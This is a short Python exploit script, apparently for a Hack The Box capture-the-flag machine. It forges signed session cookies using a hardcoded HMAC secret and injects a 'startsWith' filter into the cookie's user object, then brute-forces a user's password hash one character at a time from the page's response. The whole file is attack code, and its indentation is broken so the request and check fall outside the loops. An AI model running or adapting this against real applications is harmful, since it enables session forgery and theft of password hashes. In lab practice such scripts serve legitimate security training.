import requests
import json
import base64
import hmac

url = "http://download.htb"
key_secret = b"8929874489719802418902487651347865819634518936754"
def get_signature(string):
    return base64.urlsafe_b64encode(hmac.new(key_secret, msg=string.encode(),
digestmod="sha1").digest()).decode().rstrip("=")
def get_cookies(data):
    data_cookie = base64.b64encode(json.dumps(data).encode()).decode()
    return {
        "download_session": data_cookie,
        "download_session.sig": get_signature(f"download_session={data_cookie}")
    }
known = ""

for _ in range(32):
    for char in "0123456789abcdef":
        cookies = get_cookies(
            {
                "user": {
                    "id": 1,
                    "password": {
                        "startsWith": known + char
                    }
                }
            }
    )
response = requests.get(f"{url}/home/", cookies=cookies)

if "No files found" not in response.text:
    known += char
    print("Found next char of password hash: ", known)